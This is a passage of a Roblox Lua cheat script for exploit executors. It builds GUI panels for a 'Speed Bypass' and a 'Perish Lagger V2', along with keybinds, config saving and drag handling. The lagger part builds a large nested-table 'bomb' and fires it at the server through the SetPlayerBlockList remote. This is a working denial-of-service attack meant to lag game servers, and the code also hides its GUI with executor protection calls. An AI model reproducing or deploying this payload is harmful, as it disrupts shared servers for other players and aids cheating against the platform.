	kbLbl.Position = UDim2.fromOffset(10, 0)
	kbLbl.BackgroundTransparency = 1
	kbLbl.Text = "KB:"
	kbLbl.TextColor3 = Color3.fromRGB(125, 125, 125)
	kbLbl.Font = Enum.Font.GothamBold
	kbLbl.TextSize = 9
	kbLbl.ZIndex = 5

	local kbButton = Instance.new("TextButton", keyRow)
	kbButton.Size = UDim2.fromOffset(60, 22)
	kbButton.Position = UDim2.fromOffset(40, 3)
	kbButton.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	kbButton.BorderSizePixel = 0
	kbButton.Text = boundKey.Name
	kbButton.TextColor3 = Color3.fromRGB(248, 248, 248)
	kbButton.Font = Enum.Font.GothamBold
	kbButton.TextSize = 10
	kbButton.ZIndex = 6
	corner(kbButton, 5)
	stroke(kbButton, Color3.fromRGB(52, 52, 52), 1)

	local bgLbl = Instance.new("TextLabel", keyRow)
	bgLbl.Size = UDim2.fromOffset(28, 28)
	bgLbl.Position = UDim2.new(0.5, 8, 0, 0)
	bgLbl.BackgroundTransparency = 1
	bgLbl.Text = "BG:"
	bgLbl.TextColor3 = Color3.fromRGB(125, 125, 125)
	bgLbl.Font = Enum.Font.GothamBold
	bgLbl.TextSize = 9
	bgLbl.ZIndex = 5

	local bgButton = Instance.new("TextButton", keyRow)
	bgButton.Size = UDim2.fromOffset(50, 22)
	bgButton.Position = UDim2.new(1, -56, 0, 3)
	bgButton.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	bgButton.BorderSizePixel = 0
	bgButton.Text = "#" .. tostring(savedBgIndex)
	bgButton.TextColor3 = Color3.fromRGB(180, 210, 255)
	bgButton.Font = Enum.Font.GothamBold
	bgButton.TextSize = 10
	bgButton.ZIndex = 6
	corner(bgButton, 5)
	stroke(bgButton, Color3.fromRGB(52, 52, 52), 1)

	-- Status ring area
	local ringInner = Instance.new("Frame", main)
	ringInner.Size = UDim2.new(1, -20, 0, 110)
	ringInner.Position = UDim2.fromOffset(10, 80)
	ringInner.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	ringInner.BackgroundTransparency = 0.25
	ringInner.BorderSizePixel = 0
	ringInner.ZIndex = 4
	corner(ringInner, 12)
	stroke(ringInner, Color3.fromRGB(40, 40, 48), 1)

	local statusLabel = Instance.new("TextLabel", ringInner)
	statusLabel.Size = UDim2.new(1, 0, 0, 14)
	statusLabel.Position = UDim2.fromOffset(0, 8)
	statusLabel.BackgroundTransparency = 1
	statusLabel.Text = "OFFLINE"
	statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
	statusLabel.Font = Enum.Font.GothamBold
	statusLabel.TextSize = 10
	statusLabel.ZIndex = 5

	local powerText = Instance.new("TextLabel", ringInner)
	powerText.Size = UDim2.new(1, 0, 0, 36)
	powerText.Position = UDim2.fromOffset(0, 24)
	powerText.BackgroundTransparency = 1
	powerText.Text = "97K"
	powerText.TextColor3 = Color3.fromRGB(255, 255, 255)
	powerText.Font = Enum.Font.GothamBlack
	powerText.TextSize = 28
	powerText.ZIndex = 5

	local timerText = Instance.new("TextLabel", ringInner)
	timerText.Size = UDim2.new(1, 0, 0, 12)
	timerText.Position = UDim2.fromOffset(0, 60)
	timerText.BackgroundTransparency = 1
	timerText.Text = "00:00"
	timerText.TextColor3 = Color3.fromRGB(106, 106, 106)
	timerText.Font = Enum.Font.Gotham
	timerText.TextSize = 10
	timerText.ZIndex = 5

	local powerBox = Instance.new("TextBox", ringInner)
	powerBox.Size = UDim2.new(1, -14, 0, 22)
	powerBox.Position = UDim2.new(0, 7, 1, -28)
	powerBox.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
	powerBox.BorderSizePixel = 0
	powerBox.ClearTextOnFocus = false
	powerBox.Text = tostring(_G.AceVisBypassPower or 97000)
	powerBox.TextColor3 = Color3.fromRGB(205, 205, 205)
	powerBox.Font = Enum.Font.GothamBold
	powerBox.TextSize = 11
	powerBox.ZIndex = 6
	corner(powerBox, 6)

	local activateButton = Instance.new("TextButton", main)
	activateButton.Size = UDim2.new(1, -18, 0, 40)
	activateButton.Position = UDim2.fromOffset(9, 200)
	activateButton.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
	activateButton.BorderSizePixel = 0
	activateButton.Text = "ACTIVATE"
	activateButton.TextColor3 = Color3.fromRGB(41, 128, 255)
	activateButton.Font = Enum.Font.GothamBold
	activateButton.TextSize = 12
	activateButton.AutoButtonColor = false
	activateButton.ZIndex = 5
	corner(activateButton, 10)

	local closeBtn = Instance.new("TextButton", main)
	closeBtn.Size = UDim2.new(1, -18, 0, 28)
	closeBtn.Position = UDim2.fromOffset(9, 250)
	closeBtn.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
	closeBtn.BorderSizePixel = 0
	closeBtn.Text = "CLOSE"
	closeBtn.TextColor3 = Color3.fromRGB(255, 180, 180)
	closeBtn.Font = Enum.Font.GothamBold
	closeBtn.TextSize = 11
	closeBtn.ZIndex = 5
	corner(closeBtn, 8)

	local discLbl = Instance.new("TextLabel", main)
	discLbl.Size = UDim2.new(1, 0, 0, 22)
	discLbl.Position = UDim2.fromOffset(0, 288)
	discLbl.BackgroundTransparency = 1
	discLbl.Text = "ILUSIÓN · Speed Bypass"
	discLbl.TextColor3 = Color3.fromRGB(160, 160, 170)
	discLbl.Font = Enum.Font.GothamBold
	discLbl.TextSize = 11
	discLbl.ZIndex = 5

	-- ===== MINI PANEL (nút -) =====
	local mini = Instance.new("Frame", gui)
	mini.Name = "MiniFrame"
	mini.Size = UDim2.fromOffset(230, 92)
	mini.Position = main.Position
	mini.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	mini.BorderSizePixel = 0
	mini.Active = true
	mini.Visible = false
	mini.ClipsDescendants = true
	mini.ZIndex = 40
	corner(mini, 13)
	stroke(mini, Color3.fromRGB(39, 39, 39), 1.3)

	local miniBg = Instance.new("ImageLabel", mini)
	miniBg.Size = UDim2.new(1, 0, 1, 0)
	miniBg.BackgroundTransparency = 1
	miniBg.Image = bgImg.Image
	miniBg.ScaleType = Enum.ScaleType.Crop
	miniBg.ImageTransparency = 0.4
	miniBg.ZIndex = 40
	corner(miniBg, 13)

	local miniHeader = Instance.new("Frame", mini)
	miniHeader.Size = UDim2.new(1, -6, 0, 31)
	miniHeader.Position = UDim2.fromOffset(3, 3)
	miniHeader.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	miniHeader.BackgroundTransparency = 0.15
	miniHeader.BorderSizePixel = 0
	miniHeader.ZIndex = 42
	corner(miniHeader, 10)

	local miniTitle1 = Instance.new("TextLabel", miniHeader)
	miniTitle1.Size = UDim2.fromOffset(36, 31)
	miniTitle1.Position = UDim2.fromOffset(12, 0)
	miniTitle1.BackgroundTransparency = 1
	miniTitle1.Text = "VIS"
	miniTitle1.TextColor3 = Color3.fromRGB(255, 255, 255)
	miniTitle1.Font = Enum.Font.GothamBold
	miniTitle1.TextSize = 11
	miniTitle1.ZIndex = 44

	local miniTitle2 = Instance.new("TextLabel", miniHeader)
	miniTitle2.Size = UDim2.fromOffset(70, 31)
	miniTitle2.Position = UDim2.fromOffset(44, 0)
	miniTitle2.BackgroundTransparency = 1
	miniTitle2.Text = "BYPASS"
	miniTitle2.TextColor3 = Color3.fromRGB(41, 128, 255)
	miniTitle2.Font = Enum.Font.GothamBold
	miniTitle2.TextSize = 11
	miniTitle2.ZIndex = 44

	-- LOCK cạnh nút + (giống full panel)
	local miniLock = Instance.new("TextButton", miniHeader)
	miniLock.Size = UDim2.fromOffset(48, 22)
	miniLock.Position = UDim2.new(1, -88, 0.5, -11)
	miniLock.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
	miniLock.BorderSizePixel = 0
	miniLock.Text = "LOCK"
	miniLock.TextColor3 = Color3.fromRGB(180, 180, 190)
	miniLock.Font = Enum.Font.GothamBold
	miniLock.TextSize = 9
	miniLock.ZIndex = 46
	miniLock.AutoButtonColor = false
	corner(miniLock, 6)
	stroke(miniLock, Color3.fromRGB(48, 48, 48), 1)

	local unhideBtn = Instance.new("TextButton", miniHeader)
	unhideBtn.Size = UDim2.fromOffset(30, 22)
	unhideBtn.Position = UDim2.new(1, -36, 0.5, -11)
	unhideBtn.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
	unhideBtn.BorderSizePixel = 0
	unhideBtn.Text = "+"
	unhideBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	unhideBtn.Font = Enum.Font.GothamBold
	unhideBtn.TextSize = 14
	unhideBtn.ZIndex = 45
	unhideBtn.AutoButtonColor = false
	corner(unhideBtn, 7)
	stroke(unhideBtn, Color3.fromRGB(48, 48, 48), 1)

	local miniActivate = Instance.new("TextButton", mini)
	miniActivate.Size = UDim2.new(1, -18, 0, 36)
	miniActivate.Position = UDim2.fromOffset(9, 42)
	miniActivate.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
	miniActivate.BorderSizePixel = 0
	miniActivate.Text = "ACTIVATE"
	miniActivate.TextColor3 = Color3.fromRGB(41, 128, 255)
	miniActivate.Font = Enum.Font.GothamBold
	miniActivate.TextSize = 11
	miniActivate.AutoButtonColor = false
	miniActivate.ZIndex = 42
	corner(miniActivate, 10)

	-- ===== STATE =====
	local active = false
	local locked = false
	local forceSetLocked
	local minimized = false
	local startedAt = 0
	local userWantedActive = false

	local function formatPower(n)
 n = tonumber(n) or 97000
 if n >= 1000 then return string.format("%dK", math.floor(n / 1000 + 0.5)) end
 return tostring(n)
	end

	local function syncActivateUI()
 local label = active and "DEACTIVATE" or "ACTIVATE"
 local bg = active and Color3.fromRGB(200, 0, 0) or Color3.fromRGB(16, 16, 16)
 local tc = active and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(41, 128, 255)
 activateButton.Text = label
 activateButton.BackgroundColor3 = bg
 activateButton.TextColor3 = tc
 miniActivate.Text = label
 miniActivate.BackgroundColor3 = bg
 miniActivate.TextColor3 = tc
 statusLabel.Text = active and "ONLINE" or "OFFLINE"
 statusLabel.TextColor3 = active and Color3.fromRGB(80, 255, 120) or Color3.fromRGB(200, 200, 200)
	end

	-- setActive: bình thường — KHÔNG nhận diện brainrot / không auto OFF
	local function setActive(state, fromUser)
 state = state and true or false
 local panelOpen = (main.Visible or mini.Visible) and true or false
 if fromUser then
 userWantedActive = state
 uiWantedActive = state
 end
 local shouldRun = state and panelOpen
 active = shouldRun
 uiActive = shouldRun
 if active then
 startedAt = os.clock()
 local n = math.clamp(tonumber(powerBox.Text) or 97000, 1, 999999)
 startBypass(n)
 else
 stopBypass()
 timerText.Text = "00:00"
 end
 syncActivateUI()
 -- Lưu trạng thái ON/OFF + panel
 pcall(function() saveCfg(main, powerBox.Text) end)
	end

	local function applyBg(idx)
 savedBgIndex = math.clamp(tonumber(idx) or 1, 1, #BG_IDS)
 local id = BG_IDS[savedBgIndex]
 bgImg.Image = "rbxassetid://" .. id
 miniBg.Image = bgImg.Image
 bgButton.Text = "#" .. tostring(savedBgIndex)
 saveCfg(main, powerBox.Text)
	end

	local function setMinimized(on)
 minimized = on and true or false
 uiMinimized = minimized
 if minimized then
 mini.Position = main.Position
 main.Visible = false
 mini.Visible = true
 else
 main.Position = mini.Position
 mini.Visible = false
 main.Visible = true
 end
 _G.AceVisBypassPanelOpen = true
 pcall(function() saveCfg(main, powerBox.Text) end)
	end

	-- Events
	activateButton.MouseButton1Click:Connect(function()
 setActive(not (userWantedActive or active), true)
	end)
	miniActivate.MouseButton1Click:Connect(function()
 setActive(not (userWantedActive or active), true)
	end)

	powerBox.FocusLost:Connect(function()
 local n = math.clamp(tonumber(powerBox.Text) or 97000, 1, 999999)
 powerBox.Text = tostring(n)
 powerText.Text = formatPower(n)
 _G.AceVisBypassPower = n
 saveCfg(main, n)
 if active then startBypass(n) end
	end)

	kbButton.MouseButton1Click:Connect(function()
 waitingForKey = true
 kbButton.Text = "..."
	end)

	bgButton.MouseButton1Click:Connect(function()
 applyBg((savedBgIndex % #BG_IDS) + 1)
	end)

	local function syncLockUI()
 local t = locked and "UNLOCK" or "LOCK"
 local bg = locked and Color3.fromRGB(80, 30, 30) or Color3.fromRGB(30, 30, 30)
 lockBtn.Text = t
 lockBtn.BackgroundColor3 = bg
 miniLock.Text = t
 miniLock.BackgroundColor3 = bg
	end
	lockBtn.MouseButton1Click:Connect(function()
 forceSetLocked(not locked)
 pcall(function() saveCfg(main, powerBox and powerBox.Text or "97000") end)
	end)
	miniLock.MouseButton1Click:Connect(function()
 forceSetLocked(not locked)
 pcall(function() saveCfg(main, powerBox and powerBox.Text or "97000") end)
	end)
	-- Double-check: nếu UI báo UNLOCK mà vẫn locked=true → bấm lại force
	_G.AceSetVisBypassLock = function(on)
 forceSetLocked(on)
	end

	hideBtn.MouseButton1Click:Connect(function() setMinimized(true) end)
	unhideBtn.MouseButton1Click:Connect(function() setMinimized(false) end)

	-- Drag (main + mini) — riêng lock Speed Bypass, không dính St.guiLock
	-- Kéo bằng header / vùng trống; Unlock phải kéo được ngay
	local function makeDrag(frame)
 local dragging, dragStart, startPos = false, nil, nil
 local UIS_ = UserInputService or UIS or game:GetService("UserInputService")
 local function isInteractive(obj)
 while obj and obj ~= frame do
 if obj:IsA("TextBox") then return true end
 if obj:IsA("GuiButton") then
 local n = tostring(obj.Name or "")
 -- cho phép kéo nếu bấm vào vùng không phải nút chức năng quan trọng
 if n == "LockBtn" or n == "MiniLock" or n == "CloseBtn" or n == "HideBtn"
 or n == "UnhideBtn" or n == "ActivateBtn" or n == "KbBtn" or n == "BgBtn" then
 return true
 end
 -- TextButton con khác (level...) cũng không bắt đầu drag
 return true
 end
 obj = obj.Parent
 end
 return false
 end
 -- Header drag handle: top 36px luôn kéo được khi unlock
 local dragPad = frame:FindFirstChild("DragPad")
 if not dragPad then
 dragPad = Instance.new("TextButton")
 dragPad.Name = "DragPad"
 dragPad.Size = UDim2.new(1, -100, 0, 36)
 dragPad.Position = UDim2.new(0, 0, 0, 0)
 dragPad.BackgroundTransparency = 1
 dragPad.Text = ""
 dragPad.ZIndex = 50
 dragPad.AutoButtonColor = false
 dragPad.Parent = frame
 end
 local function beginDrag(input)
 if locked then return end
 if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
 return
 end
 dragging = true
 dragStart = input.Position
 startPos = frame.Position
 end
 dragPad.InputBegan:Connect(beginDrag)
 frame.InputBegan:Connect(function(input)
 if locked then return end
 if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
 return
 end
 -- vùng trống (không nút) vẫn kéo
 if isInteractive(input.Target) then return end
 beginDrag(input)
 end)
 UIS_.InputChanged:Connect(function(input)
 if not dragging then return end
 if locked then
 dragging = false
 return
 end
 if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then
 return
 end
 local d = input.Position - dragStart
 local np = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 frame.Position = np
 if frame == main and mini then mini.Position = np end
 if frame == mini and main then main.Position = np end
 end)
 UIS_.InputEnded:Connect(function(input)
 if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
 return
 end
 if not dragging then return end
 dragging = false
 pcall(function()
 local p = main and main.Position
 if p then
 savedPos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
 _G.AceVisBypassPanelPosition = savedPos
 end
 saveCfg(main, powerBox and powerBox.Text or "97000")
 end)
 end)
	end

	forceSetLocked = function(on)
 locked = on and true or false
 _G.AceVisBypassLocked = locked
 if type(St) == "table" then St.speedBypassLock = locked end
 -- bảo đảm Active để nhận input sau unlock
 pcall(function()
 if main then main.Active = true end
 if mini then mini.Active = true end
 end)
 pcall(syncLockUI)
	end

	makeDrag(main)
	makeDrag(mini)

	-- PC keybind
	UserInputService.InputBegan:Connect(function(input, gpe)
 if waitingForKey and input.UserInputType == Enum.UserInputType.Keyboard then
 if input.KeyCode ~= Enum.KeyCode.Escape and input.KeyCode ~= Enum.KeyCode.Unknown then
 boundKey = input.KeyCode
 kbButton.Text = boundKey.Name
 waitingForKey = false
 saveCfg(main, powerBox.Text)
 else
 waitingForKey = false
 kbButton.Text = boundKey.Name
 end
 return
 end
 if gpe then return end
 if input.UserInputType == Enum.UserInputType.Keyboard and boundKey and input.KeyCode == boundKey then
 -- chỉ toggle khi panel đang hiện (full hoặc mini)
 if main.Visible or mini.Visible then
 setActive(not (userWantedActive or active), true)
 end
 end
	end)

	-- Chỉ OFF khi ẩn panel — KHÔNG nhận diện brainrot / WalkSpeed
	RunService.Heartbeat:Connect(function()
 local panelOpen = main.Visible or mini.Visible
 if not panelOpen then
 if active then
 active = false
 stopBypass()
 syncActivateUI()
 end
 end
	end)

	-- Timer
	RunService.RenderStepped:Connect(function()
 if active then
 local elapsed = math.floor(os.clock() - startedAt)
 timerText.Text = string.format("%02d:%02d", math.floor(elapsed / 60), elapsed % 60)
 end
	end)

	local function setPanelVisible(on, opts)
 on = on and true or false
 opts = type(opts) == "table" and opts or {}
 if not on then
 -- Ẩn panel → OFF bypass + lưu PanelOpen=false
 userWantedActive = false
 uiWantedActive = false
 if active then setActive(false, false) end
 stopBypass()
 active = false
 uiActive = false
 if main and main.Parent then
 local p = (minimized and mini or main).Position
 savedPos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
 _G.AceVisBypassPanelPosition = savedPos
 end
 main.Visible = false
 mini.Visible = false
 minimized = false
 uiMinimized = false
 _G.AceVisBypassPanelOpen = false
 syncActivateUI()
 saveCfg(main, powerBox.Text, { PanelOpen = false, Minimized = false, WantedActive = false })
 return
 end
 local sp = _G.AceVisBypassPanelPosition or savedPos
 if type(sp) == "table" then
 local pos = UDim2.new(tonumber(sp.xs) or 0.5, tonumber(sp.xo) or -115, tonumber(sp.ys) or 0.35, tonumber(sp.yo) or 0)
 main.Position = pos
 mini.Position = pos
 end
 local wantMini = opts.minimized == true or (opts.minimized == nil and savedMinimized == true and opts.fromLoad == true)
 minimized = wantMini and true or false
 uiMinimized = minimized
 if minimized then
 main.Visible = false
 mini.Visible = true
 else
 main.Visible = true
 mini.Visible = false
 end
 _G.AceVisBypassPanelOpen = true
 pcall(function()
 if gui then
 gui.Enabled = true
 gui.DisplayOrder = 250
 if not gui.Parent then
 local parent = (gethui and gethui()) or game:GetService("CoreGui")
 gui.Parent = parent
 end
 end
 end)
 pcall(function()
 saveCfg(main, powerBox and powerBox.Text or "97000", { PanelOpen = true, Minimized = minimized })
 end)
 -- Restore bypass nếu trước đó đang ON
 if opts.restoreActive or (opts.fromLoad and savedWantedActive) then
 userWantedActive = true
 uiWantedActive = true
 setActive(true, false)
 end
	end

	_G.AceSetVisBypassPanelVisible = setPanelVisible
	_G.AceToggleVisBypassPanel = function()
 setPanelVisible(not (main.Visible or mini.Visible))
	end

	closeBtn.MouseButton1Click:Connect(function()
 setPanelVisible(false)
	end)

	-- init
	powerText.Text = formatPower(powerBox.Text)
	applyBg(savedBgIndex)
	syncActivateUI()
	-- Tự hiện panel nếu lần trước không ẩn (PanelOpen=true)
	-- No tự mở panel khi ON script — chỉ mở khi Settings Show Panel = true
	_G.AceSetVisBypassLock = function(on)
 locked = on and true or false
 _G.AceVisBypassLocked = locked
 pcall(syncLockUI)
	end
	-- sync lock từ St / _G (độc lập Lock UI menu)
	pcall(function()
 local wantLock = false
 if type(St) == "table" and St.speedBypassLock then wantLock = true end
 if _G.AceVisBypassLocked == true then wantLock = true end
 locked = wantLock
 syncLockUI()
	end)
	task.defer(function()
 task.wait(0.15)
 local wantOpen = false
 pcall(function()
 if type(St) == "table" and St.showSpeedBypassPanel == true then wantOpen = true end
 end)
 if wantOpen then
 pcall(function()
 setPanelVisible(true, { fromLoad = true, minimized = false, restoreActive = false })
 end)
 else
 -- luôn ẩn khi load nếu user không ON show
 pcall(function()
 if main then main.Visible = false end
 if mini then mini.Visible = false end
 _G.AceVisBypassPanelOpen = false
 saveCfg(main, powerBox and powerBox.Text or "97000", { PanelOpen = false })
 end)
 end
	end)
	print("[Vis] IlusionBypass panel loaded (Noxa-style + keybind + minimize + remember open)")
end)



-- ============================================================

-- PERISH LAGGER V2 — isolated function scope (tránh 200 local limit)
task.spawn(function()
	local Players = game:GetService("Players")
	local UserInputService = game:GetService("UserInputService")
	local TweenService = game:GetService("TweenService")
	local CoreGui = game:GetService("CoreGui")
	local HttpService = game:GetService("HttpService")
	local RunService = game:GetService("RunService")
	local Stats = game:GetService("Stats")

	local LP = Players.LocalPlayer
	local PlayerGui = LP:WaitForChild("PlayerGui")
	local ConfigFile = "IlusionPerishLaggerV2.json"

	local NIVELES = {
 Low = { poder = 23 },
 Mid = { poder = 32 },
 High = { poder = 70 },
 Ultra = { poder = 90 },
	}
	local ORDER = { "Low", "Mid", "High", "Ultra" }

	local keybind = Enum.KeyCode.M
	local listeningForInput = false
	local laggerActive = false
	local lagThread = nil
	local nivelActual = "Low"
	local ventanaBloqueada = false

	local C = {
 BG = Color3.fromRGB(8, 0, 0),
 Row = Color3.fromRGB(20, 4, 4),
 Card = Color3.fromRGB(30, 6, 6),
 Red = Color3.fromRGB(255, 20, 20),
 RedDeep = Color3.fromRGB(120, 0, 0),
 RedSoft = Color3.fromRGB(255, 80, 80),
 RedDark = Color3.fromRGB(60, 8, 8),
 Text = Color3.fromRGB(255, 255, 255),
 TextDim = Color3.fromRGB(200, 180, 180),
 Stroke = Color3.fromRGB(255, 30, 30),
 Dark = Color3.fromRGB(5, 0, 0),
 Off = Color3.fromRGB(40, 10, 10),
 White = Color3.fromRGB(255, 255, 255),
 Gray = Color3.fromRGB(128, 128, 128),
 Green = Color3.fromRGB(90, 255, 170),
 Yellow = Color3.fromRGB(255, 220, 90),
	}

	local function corner(p, r)
 local x = Instance.new("UICorner")
 x.CornerRadius = UDim.new(0, r or 10)
 x.Parent = p
 return x
	end
	local function stroke(p, col, th, tr)
 local s = Instance.new("UIStroke")
 s.Color = col or C.Stroke
 s.Thickness = th or 1.2
 s.Transparency = tr or 0.35
 s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 s.Parent = p
 return s
	end
	local function shineStroke(obj)
 local s = stroke(obj, C.Red, 1.4, 0.3)
 task.spawn(function()
 local t = 0
 while s and s.Parent do
 local mf = s:FindFirstAncestorOfClass("Frame")
 -- slow down when not on-screen heavy parent visible
 if mainFrame and not mainFrame.Visible then
 task.wait(0.6)
 else
 t = t + 0.05
 s.Transparency = 0.2 + math.sin(t * 1.6) * 0.18
 if math.sin(t * 0.8) > 0.7 then s.Color = C.White else s.Color = C.Red end
 task.wait(0.06)
 end
 end
 end)
 return s
	end
	local function highlight(obj, col)
 local g = Instance.new("UIGradient", obj)
 g.Color = ColorSequence.new({
 ColorSequenceKeypoint.new(0, col or C.Red),
 ColorSequenceKeypoint.new(0.5, C.White),
 ColorSequenceKeypoint.new(1, col or C.Red),
 })
 g.Rotation = 25
 task.spawn(function()
 while g and g.Parent do
 if mainFrame and not mainFrame.Visible then
 task.wait(0.6)
 else
 g.Offset = Vector2.new((tick() * 0.35) % 2 - 1, 0)
 task.wait(0.06)
 end
 end
 end)
 return g
	end
	local function hoverLift(btn, base)
 base = base or 0.15
 btn.MouseEnter:Connect(function()
 TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundTransparency = math.max(0, base - 0.15) }):Play()
 end)
 btn.MouseLeave:Connect(function()
 TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundTransparency = base }):Play()
 end)
 btn.MouseButton1Down:Connect(function()
 TweenService:Create(btn, TweenInfo.new(0.08), { Size = btn.Size - UDim2.new(0, 2, 0, 2) }):Play()
 end)
 btn.MouseButton1Up:Connect(function()
 -- size restore handled by parent layout mostly
 end)
	end

	local mainFrame -- forward
	local savedPos = nil
	local v2PanelScale = 70 -- declare early (tránh shadow / nil khi SaveConfig)
	local function SaveConfig()
 local data = {
 Nivel = nivelActual,
 Bloqueado = (_G.AcePerishV2Locked == true),
 Locked = (_G.AcePerishV2Locked == true),
 Key = keybind.Name,
 Scale = math.clamp(tonumber(v2PanelScale) or tonumber(_G.AcePerishV2PanelScale) or 70, 1, 100),
 PanelOpen = (_G.AcePerishV2PanelOpen == true),
 }
 -- Ưu tiên vị trí hiện tại; nếu panel đang ẩn vẫn giữ Pos đã lưu
 if mainFrame and mainFrame.Parent and mainFrame.Visible then
 local p = mainFrame.Position
 data.Pos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
 _G.AcePerishV2PanelPosition = data.Pos
 savedPos = data.Pos
 elseif type(_G.AcePerishV2PanelPosition) == "table" then
 data.Pos = _G.AcePerishV2PanelPosition
 savedPos = data.Pos
 elseif type(savedPos) == "table" then
 data.Pos = savedPos
 end
 pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
	end

	local function LoadConfig()
 pcall(function()
 if not (isfile and isfile(ConfigFile)) then return end
 local data = HttpService:JSONDecode(readfile(ConfigFile))
 nivelActual = data.Nivel or "Low"
 if data.Key and Enum.KeyCode[data.Key] then keybind = Enum.KeyCode[data.Key] end
 if type(data.Pos) == "table" then
 savedPos = data.Pos
 _G.AcePerishV2PanelPosition = data.Pos
 end
 if data.Scale then
 v2PanelScale = math.clamp(tonumber(data.Scale) or 70, 1, 100)
 _G.AcePerishV2PanelScale = v2PanelScale
 end
 if data.Locked == true or data.Bloqueado == true then
 _G.AcePerishV2Locked = true
 end
 if data.PanelOpen == true then
 _G.AcePerishV2PanelOpen = true
 end
 end)
	end
	LoadConfig()

	local cachedBomb, cachedPower = nil, nil
	local function buildBomb(poder)
 local mainT, spam = {}, {{}}
 local z = spam[1]
 for i = 1, 25 do local t = {}; table.insert(z, t); z = t end
 local max = math.min(12000, (tonumber(poder) or 23) * 50)
 for i = 1, max do table.insert(mainT, spam) end
 return mainT
	end
	local function fireBomb()
 if not cachedBomb or cachedPower ~= NIVELES[nivelActual].poder then
 cachedPower = NIVELES[nivelActual].poder
 cachedBomb = buildBomb(cachedPower)
 end
 pcall(function()
 game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(cachedBomb)
 end)
	end

	pcall(function()
 for _, parent in ipairs({ CoreGui, PlayerGui }) do
 local old = parent:FindFirstChild("Per1shccLaggerV2")
 if old then old:Destroy() end
 end
	end)

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "Per1shccLaggerV2"
	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	screenGui.ResetOnSpawn = false
	screenGui.IgnoreGuiInset = true
	screenGui.DisplayOrder = 60
	pcall(function() if syn and syn.protect_gui then syn.protect_gui(screenGui) end end)
	local okP = pcall(function() screenGui.Parent = CoreGui end)
	if not okP then screenGui.Parent = PlayerGui end

	local W, H = 286, 178

	mainFrame = Instance.new("Frame", screenGui)
	mainFrame.Name = "MainFrame"
	mainFrame.Size = UDim2.new(0, W, 0, H)
	if savedPos then
 mainFrame.Position = UDim2.new(
 tonumber(savedPos.xs) or 0.14, tonumber(savedPos.xo) or 0,
 tonumber(savedPos.ys) or 0.5, tonumber(savedPos.yo) or -H / 2
 )
	else
 mainFrame.Position = UDim2.new(0.14, 0, 0.5, -H / 2)
	end
	mainFrame.BackgroundColor3 = C.BG
	mainFrame.BackgroundTransparency = 0.08
	mainFrame.BorderSizePixel = 0
	mainFrame.ClipsDescendants = true
	mainFrame.Active = true
	mainFrame.Visible = false -- mở từ menu như V1

	-- Scale V2 panel (dùng v2PanelScale đã LoadConfig)
	v2PanelScale = math.clamp(tonumber(v2PanelScale) or tonumber(_G.AcePerishV2PanelScale) or 70, 1, 100)
	local uiScale = Instance.new("UIScale")
	uiScale.Name = "V2PanelScale"
	uiScale.Scale = v2PanelScale / 100
	uiScale.Parent = mainFrame
	_G.AcePerishV2PanelScale = v2PanelScale
	_G.AceSetPerishV2PanelScale = function(v)
 v = math.clamp(tonumber(v) or 70, 1, 100)
 v2PanelScale = v
 _G.AcePerishV2PanelScale = v
 uiScale.Scale = v / 100
 pcall(SaveConfig)
	end

	corner(mainFrame, 16)

	-- BACKGROUND IMAGE + TINT (full)
	local bgImg = Instance.new("ImageLabel", mainFrame)
	bgImg.Size = UDim2.new(1, 0, 1, 0)
	bgImg.BackgroundTransparency = 1
	bgImg.Image = "rbxassetid://77503307528071"
	bgImg.ScaleType = Enum.ScaleType.Crop
	bgImg.ImageTransparency = 0.2
	bgImg.ZIndex = 0
	corner(bgImg, 16)

	local bgTint = Instance.new("Frame", mainFrame)
	bgTint.Size = UDim2.new(1, 0, 1, 0)
	bgTint.BackgroundColor3 = C.Dark
	bgTint.BackgroundTransparency = 0.35
	bgTint.BorderSizePixel = 0
	bgTint.ZIndex = 0
	corner(bgTint, 16)
	local tintGrad = Instance.new("UIGradient", bgTint)
	tintGrad.Rotation = 120
	tintGrad.Color = ColorSequence.new({
 ColorSequenceKeypoint.new(0, C.RedDeep),
 ColorSequenceKeypoint.new(0.55, C.BG),
 ColorSequenceKeypoint.new(1, C.Red),
	})
	tintGrad.Transparency = NumberSequence.new({
 NumberSequenceKeypoint.new(0, 0.35),
 NumberSequenceKeypoint.new(0.5, 0.75),
 NumberSequenceKeypoint.new(1, 0.4),
	})
	task.spawn(function()
 while tintGrad and tintGrad.Parent do
 tintGrad.Rotation = (tintGrad.Rotation + 0.4) % 360
 task.wait(0.05)
 end
	end)

	shineStroke(mainFrame)

	-- PARTICLES (full)
	local particles = {}
	for i = 1, 26 do
 local p = Instance.new("Frame", mainFrame)
 p.BorderSizePixel = 0
